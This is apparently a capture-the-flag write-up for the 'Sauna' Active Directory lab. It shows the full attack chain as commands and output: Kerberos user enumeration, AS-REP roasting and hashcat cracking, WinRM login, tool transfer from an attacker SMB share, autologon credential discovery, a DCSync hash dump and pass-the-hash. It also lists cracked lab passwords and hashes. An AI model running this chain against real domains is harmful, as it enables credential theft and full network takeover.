---
description: 09-26-22
---

# Sauna (Easy)

## Information Gathering

Enumerated TCP Ports:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-27 03:12:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Enumerated UDP ports:

```
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap
```

Notes:

* HTTP, we visit the web server and we can see what we have access to
  * Possible Users:
    * Johnson
    * Watson
    * Admin
    * Jenny joy
    * James Doe
    * Fergus Smith
    * Shaun Coins
    * Hugo Bear
    * Bowie Taylor
    * Sophie Driver
    * Steven Kerb
* From DNS, we see that we have a domain name:

&#x20;<mark style="color:yellow;">EGOTISTICAL-BANK.LOCAL</mark>

* Added to /etc/hosts
* 88 We have Kerberos open. We can attempt Kerberoasting/AS-REPRoasting if we enumerate users
* WinRM is open

## Enumeration

### Port 80 - HTTP (IIS 10.0)

Title: Egotistical Bank

Contains: Search function and Comments function. Both appear broken

* <mark style="color:yellow;">"405 HTTP Verb used to access this page is not allowed."</mark>

Dirsearch

```
dirsearch -u http://10.129.148.212                                                         Mon 26 Sep 2022 04:32:58 PM EDT

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/xyconix/.dirsearch/reports/10.129.148.212/_22-09-26_16-33-01.txt

Error Log: /home/xyconix/.dirsearch/logs/errors-22-09-26_16-33-01.log

Target: http://10.129.148.212/

[16:33:01] Starting: 
[16:33:03] 403 -  312B  - /%2e%2e//google.com                              
[16:33:08] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:33:08] 200 -   30KB - /about.html                                       
[16:33:16] 200 -   15KB - /contact.html                                     
[16:33:16] 301 -  149B  - /css  ->  http://10.129.148.212/css/              
[16:33:19] 301 -  151B  - /fonts  ->  http://10.129.148.212/fonts/          
[16:33:20] 301 -  152B  - /images  ->  http://10.129.148.212/images/        
[16:33:20] 403 -    1KB - /images/
[16:33:20] 200 -   32KB - /index.html
```

* <mark style="color:yellow;">We are able to grab some potential usernames from the content of the site</mark>
* <mark style="color:yellow;">I attempted to use the usernames that I manually enumerated but none of them worked</mark>
* <mark style="color:yellow;">Let's use the giant wordlist found in /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</mark>

### Kerbrute - Username Enumeration

```
./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.148.212

2022/09/26 16:55:10 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2022/09/26 16:56:37 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2022/09/26 16:56:54 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2022/09/26 16:57:42 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2022/09/26 17:03:35 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL

```

* administrator
* hsmith
* fsmith
* I went ahead and put these in a new users file called <mark style="color:yellow;">users1</mark>
* Let's attempt AS-REP Roasting for an easy win before we go any further into our enumeration

### Port 389 - LDAP&#x20;

Enum4Linux

```
enum4linux -a 10.129.148.212
```

## Exploitation

### AS-REP Roasting

This is the exploit that I used to gain access to the fsmith account

GetNPUsers

```
impacket-GetNPUsers  EGOTISTICAL-BANK.LOCAL/ -usersfile users1 -o-pass

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6bc5a5d28ad416aaa29561e9c952ab96$57c51c39c7c65cebda2e2550f78dbbd7750534e2ce7e610f407e180b44b1cbeac8ef6c976cf2238537412698a47c081e291b67b7d8804380fa048031ef8fea043178f49a60bfe764ed715dbced0dd1c9bfe24b19c71931032c789b0d7c378e6f299293c562f797be0d2c91153c512dc1357aff4fb48b3382160f0182c500e68b1a5387cb22cdaacec06f3dc55a8b49c0f2c72f0cd2a2256569c84309d8421b4df28258b742fc6583bb1e2151f424ce84b639fb9d065e55c156d2383c2849c44e0e3b0cb8ce3a6ec1544e1d048fc21cdaf26004b61c168d05b41964708f69eef4d78f0da3e5c7345c7c36ab85c9a8ffe64ae5824380ae9ab0ecde7e987716dda3
$krb5asrep$23$Fsmith@EGOTISTICAL-BANK.LOCAL:b829642fd9df4d29d5262b7913e4c7d0$4e348b434d64ba8afa4f5133bc4650061e39d77f3a89e098f6631ed979cf40c0d90cdc8520378d77a3079f8bc98c3e930a5db4820d6782b5fb86822d783d400c1bd231a4ecc16dbf7917775ddcbf9c5b76183b517e761939a8f0ddb40674e72f47746acef52d8f4336cc85d120bcaebd0aa087c09d8310d59be00a39336c70a440e0606e3f353fdf9daf3a72a8746c759deeaa6e0b24e397b328672b12e271292eb6caae6f71d54e53b7c2bc4b00dc337b737c15bd17fb3b4b9af03e4ebe598c06d49239ffc0e824a429c87bbb66b1ac92f8cab163a1244c6b2945c7b5145eaaa4c11f6e4ce91cee99d15eb3555dd70dc717dfda7b5405381a5221c17d9a071f
```

* We see that we successfully obtained hashes for the fsmith account
* Now that we have this hash, let's take it offline and crack it with hashcat!

### Cracking Hash w/ Hashcat

```
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
```

* We have success!
* <mark style="color:yellow;">Fsmith:Thestrokes23</mark>
* The next logical step is to try to evil-winrm into the box

### Evil-WinRM (5985)

```
evil-winrm -i 10.129.148.212 -u Fsmith
Password: Thestrokes23

*Evil-WinRM* PS C:\Users\FSmith\Documents> 
```

* I then grab the user flag and prepare my post-exploitation methodology
* First, I prepare my smb server on Kali and connect to it on the Windows target

Kali:

```
impacket-smbserver smb . -smb2support
```

Windows:

```
net use \\kali-ip\smb
The command completed successfully
```

## Privilege Escalation

### Local enumeration

Import and Invoke of adPEAS.ps1:

```
copy \\10.10.16.19\smb\adPEAS.ps1
Import-Module .\ADPeas.ps1
Invoke-ADPeas
```

adPEAS.ps1 Output:

```
[*] +++++ Starting adPEAS Version 0.7.13 +++++
adPEAS version 0.7.13
[*] +++++ Starting Enumeration +++++
[*] +++++ Searching for Domain Information +++++
[*] +++++ Checking Domain +++++
Checking Domain - Details for Domain 'EGOTISTICAL-BANK.LOCAL':


Domain Name             : EGOTISTICAL-BANK.LOCAL
Domain SID              : S-1-5-21-2966785786-3096785034-1186376766
Domain Functional Level : Windows 2016
Forest Name             : EGOTISTICAL-BANK.LOCAL
Forest Children         : No Subdomain[s] available
Domain Controller       : SAUNA.EGOTISTICAL-BANK.LOCAL

[*] +++++ Checking Password and Kerberos Policy +++++
Checking Password Policy - Details for Domain 'EGOTISTICAL-BANK.LOCAL':
Minimum Password Age    : 1 days
Maximum Password Age    : 42 days
Minimum Password Length : 7 character
Password Complexity     : Enabled
Lockout Account         : Disabled
Reversible Encryption   : Disabled

Checking Kerberos Policy - Details for Domain 'EGOTISTICAL-BANK.LOCAL':
Maximum Age of TGT            : 10 hours
Maximum Age of TGS            : 600 minutes
Maximum Clock Time Difference : 5 minutes
Krbtgt Password Last Set      : 1/22/2020 9:45:30 PM

[*] +++++ Checking Domain Controller, Sites and Subnets +++++
Checking Domain Controller - Details for Domain 'EGOTISTICAL-BANK.LOCAL':
DC Host Name  : SAUNA.EGOTISTICAL-BANK.LOCAL
DC IP Address : fe80::19:83a6:7428:36a9%7
Site Name     : Default-First-Site-Name
Domain        : EGOTISTICAL-BANK.LOCAL

[*] +++++ Checking Forest and Domain Trusts +++++
[*] +++++ Checking DCSync Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
Checking DCSync Rights - Details for Domain 'EGOTISTICAL-BANK.LOCAL':
ActiveDirectoryRight : DS-Replication-Get-Changes
Identity             : EGOTISTICALBANK\svc_loanmgr
distinguishedName    : CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectSID            : S-1-5-21-2966785786-3096785034-1186376766-1108

ActiveDirectoryRight : DS-Replication-Get-Changes-All
Identity             : EGOTISTICALBANK\svc_loanmgr
distinguishedName    : CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectSID            : S-1-5-21-2966785786-3096785034-1186376766-1108

[*] +++++ Checking GenericAll Rights +++++
[*] https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
Checking GenericAll Rights - Details for Domain 'EGOTISTICAL-BANK.LOCAL':
[*] +++++ Searching for Certificate Authority Information +++++
[*] +++++ Searching for Enterprise CA +++++
[*] https://posts.specterops.io/certified-pre-owned-d95910965cd2
[*] +++++ Searching for Vulnerable Certificate Templates +++++
[*] +++++ Searching for Credentials Exposure +++++
[*] +++++ Searching for ASREPRoast Users +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast
[!] Account FSmith does not require kerberos preauthentication to get a TGT
[*] Hashcat usage: Hashcat -m 18200
Searching for ASREPRoast Users - Details for User 'FSmith':
sAMAccountName     : FSmith
userPrincipalName  : FSmith@EGOTISTICAL-BANK.LOCAL
distinguishedName  : CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        :
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-1105
userAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
memberOf           : CN=Remote Management Users,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
pwdLastSet         : 1/23/2020 8:45:19 AM
lastLogonTimestamp : 9/26/2022 8:57:43 PM

$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:0130336243ffd2b9771010795b3f3038$680ab723bd5055bc2ca18b8d10a4a10bbcbc91b2f022dda18c4a6605cb8b6951677eca09b5b6b3f1b7a2857a44f5342567d3829508c74799303b6476521e93983b276ebd748bf6088620f7d6d34a73ed6ee10bea0c71f3dfba473376c0ac9da669498b586545a120c289a262f1dc65bd8168c7f81d7336134ac4608310828f6800fa848b480cd42ca551bb29fd0519356e8917479eb0458a87a1b55f9e13a865d908f440baaaa4884be9eb26e554708e425556405391e6136f3a23ee61c4cc0a5ec326e9dfa10491aa77afb3ffd48c5a0679e01495c7492d5bda922dbae5f1c6f5d4fc19a393a73f597711222247559baae0191ff2d85ed87efdfdc81a11a965
[*] +++++ Searching for Kerberoastable Users +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast#kerberoast
[*] +++++ Searching for Users with a set 'Linux/Unix Password' attribute +++++
[*] https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
[*] +++++ Searching for Users with a set 'extensionData' attribute +++++
[*] +++++ Searching for Computers with enabled and readable LAPS attribute +++++
[*] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#antivirus-and-detectors
[*] +++++ Searching for Group Managed Service Accounts (gMSA) +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
[*] +++++ Searching for Crypted Passwords in SYSVOL Group Policy Objects +++++
[*] https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/
[*] +++++ Searching for Sensitive Information in NETLOGON Share +++++
[*] +++++ Searching for Delegation Issues +++++
[*] +++++ Searching for Computers with Unconstrained Delegation Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/unconstrained-delegation
[*] +++++ Searching for Computers with Constrained Delegation Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation
[*] +++++ Searching for Computers with Resource-Based Constrained Delegation Rights +++++
[*] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
[*] +++++ Searching for Users with Constrained Delegation Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation
[*] +++++ Searching for Users with Resource-Based Constrained Delegation Rights +++++
[*] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
[*] +++++ Starting Account Enumeration +++++
[*] +++++ Starting Domain User Enumeration +++++
[*] +++++ Searching for Searching for Azure AD Connect +++++
[*] https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html
[*] +++++ Searching for Users in High Privileged Groups +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Administrators':
GroupName         : Enterprise Admins
distinguishedName : CN=Enterprise Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description       : Designated administrators of the enterprise
objectSid         : S-1-5-21-2966785786-3096785034-1186376766-519
MemberDomain      : EGOTISTICAL-BANK.LOCAL

GroupName         : Domain Admins
distinguishedName : CN=Domain Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description       : Designated administrators of the domain
objectSid         : S-1-5-21-2966785786-3096785034-1186376766-512
MemberDomain      : EGOTISTICAL-BANK.LOCAL

sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-500
MemberDomain       : EGOTISTICAL-BANK.LOCAL
pwdLastSet         : 7/26/2021 9:16:16 AM
lastLogonTimestamp : 9/26/2022 8:02:37 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'EGOTISTICALBANK\Domain Admins':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-500
MemberDomain       : EGOTISTICAL-BANK.LOCAL
pwdLastSet         : 7/26/2021 9:16:16 AM
lastLogonTimestamp : 9/26/2022 8:02:37 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'EGOTISTICALBANK\Enterprise Admins':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-500
MemberDomain       : EGOTISTICAL-BANK.LOCAL
pwdLastSet         : 7/26/2021 9:16:16 AM
lastLogonTimestamp : 9/26/2022 8:02:37 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'EGOTISTICALBANK\Group Policy Creator Owners':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-500
MemberDomain       : EGOTISTICAL-BANK.LOCAL
pwdLastSet         : 7/26/2021 9:16:16 AM
lastLogonTimestamp : 9/26/2022 8:02:37 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

Searching for Users in High Privileged Groups - Members of Group 'EGOTISTICALBANK\DnsAdmins':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Account Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Server Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Print Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Backup Operators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Hyper-V Administrators':
Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Access Control Assistance Operators':
sAMAccountName     : svc_loanmgr
userPrincipalName  : svc_loanmgr@EGOTISTICAL-BANK.LOCAL
distinguishedName  : CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        :
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-1108
MemberDomain       : EGOTISTICAL-BANK.LOCAL
pwdLastSet         : 1/24/2020 3:48:31 PM
lastLogonTimestamp : 1/24/2020 4:05:02 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD

sAMAccountName     : FSmith
userPrincipalName  : FSmith@EGOTISTICAL-BANK.LOCAL
distinguishedName  : CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        :
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-1105
MemberDomain       : EGOTISTICAL-BANK.LOCAL
pwdLastSet         : 1/23/2020 8:45:19 AM
lastLogonTimestamp : 9/26/2022 8:57:43 PM
UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

Searching for Users in High Privileged Groups - Members of Group 'EGOTISTICALBANK\Cert Publishers':
[*] +++++ Searching for High Privileged Users where the Password does not expire +++++
[*] https://ldapwiki.com/wiki/DONT_EXPIRE_PASSWORD
[!] The password of account 'Administrator' does not expire
[+] The account 'Administrator' is or was member of a high privileged protected group
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#adminsdholder-group
Searching for High Privileged Users where the Password does not expire - Details for User 'Administrator':
sAMAccountName     : Administrator
userPrincipalName  :
distinguishedName  : CN=Administrator,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
description        : Built-in account for administering the computer/domain
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-500
userAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
memberOf           : CN=Group Policy Creator Owners,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
                     CN=Domain Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
                     CN=Enterprise Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
                     CN=Schema Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
                     CN=Administrators,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
pwdLastSet         : 7/26/2021 9:16:16 AM
lastLogonTimestamp : 9/26/2022 8:02:37 PM

[*] +++++ Searching for High Privileged Users which may not require a Password +++++
[*] https://ldapwiki.com/wiki/PASSWD_NOTREQD
[*] +++++ Starting Computer Enumeration +++++
[*] +++++ Searching Domain Controllers +++++
Searching for Domain Controllers - Details for Computer 'SAUNA$':
sAMAccountName     : SAUNA$
dNSHostName        : SAUNA.EGOTISTICAL-BANK.LOCAL
distinguishedName  : CN=SAUNA,OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
IPv4Address        : 10.129.148.212
operatingSystem    : Windows Server 2019 Datacenter
description        :
objectSid          : S-1-5-21-2966785786-3096785034-1186376766-1000
userAccountControl : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION

[*] +++++ Searching for Exchange Servers +++++
[*] +++++ Searching for Enterprise CA Servers +++++
[*] +++++ Starting BloodHound Enumeration +++++

Status                 : Faulted
IsCanceled             : False
IsCompleted            : True
CreationOptions        : None
AsyncState             :
IsFaulted              : True
AsyncWaitHandle        : System.Threading.ManualResetEvent
CompletedSynchronously : False

2022-09-26T23:12:39.2279522-07:00|INFORMATION|Resolved Collection Methods: Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps
2022-09-26T23:12:39.2435789-07:00|INFORMATION|Initializing SharpHound at 11:12 PM on 9/26/2022
2022-09-26T23:13:03.4055274-07:00|INFORMATION|Flags: Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps
2022-09-26T23:13:03.5617000-07:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
2022-09-26T23:13:03.6085654-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-09-26T23:13:03.6085654-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-09-26T23:13:33.9926047-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 145 MB RAM
2022-09-26T23:14:03.9976132-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 147 MB RAM
2022-09-26T23:14:10.7242972-07:00|INFORMATION|Consumers finished, closing output channel
2022-09-26T23:14:10.7555442-07:00|INFORMATION|Output channel closed, waiting for output task to complete
```

### PrivEsc vector

* We notice from the adPEAS.ps1 output that we could potentially have <mark style="color:yellow;">dcsync rights</mark> as the <mark style="color:yellow;">svc\_loanmgr</mark> service account

```
[*] +++++ Checking DCSync Rights +++++
[*] https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
Checking DCSync Rights - Details for Domain 'EGOTISTICAL-BANK.LOCAL':
ActiveDirectoryRight : DS-Replication-Get-Changes
Identity             : EGOTISTICALBANK\svc_loanmgr
distinguishedName    : CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
ObjectSID            : S-1-5-21-2966785786-3096785034-1186376766-1108
```

* H<mark style="color:yellow;">owever, we need a password to pass dcsync rights as Administrator, so we need svc\_loanmgr's password</mark>!
* Thinking that I missed something, I load up winPEAS!

### WinPEAS

* <mark style="color:yellow;">We find the ultimate easy win</mark>
* Cleartext credentials were found being stored insecurely on the system!

```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

* Time to validate these credentials

Evil-WinRM:

```
evil-winrm -i 10.129.148.212 -u svc_loanmgr
Password: Moneymakestheworldgoround!

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
```

* <mark style="color:yellow;">svc\_loanmgr:Moneymakestheworldgoround!</mark>
* Validated!
* Let's see if we can now execute our DCSYNC rights and dump the domain hashes!

### DCSYNC RIGHTS

Impacket-secretsdump:

```
impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.129.148.212'                Mon 26 Sep 2022 07:40:13 PM EDT
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:76752e2d8dcabe95679b6b852b653445:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:44ba59ca5b509f4d8183113bb78fef86e4768810915ca82c0e5abab987af46cd
SAUNA$:aes128-cts-hmac-sha1-96:44501cb432e327567c8c85203e812a64
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up...
```

* We get the Administrator hash!
* Let's now pass the hash using wmiexec, psexec, or Evil-WinRM!

PTH impacket-wmiexec:

```
impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' Administrator@10.129.148.212
```

* We win!

## Proofs

User Proof:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Root Proof:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
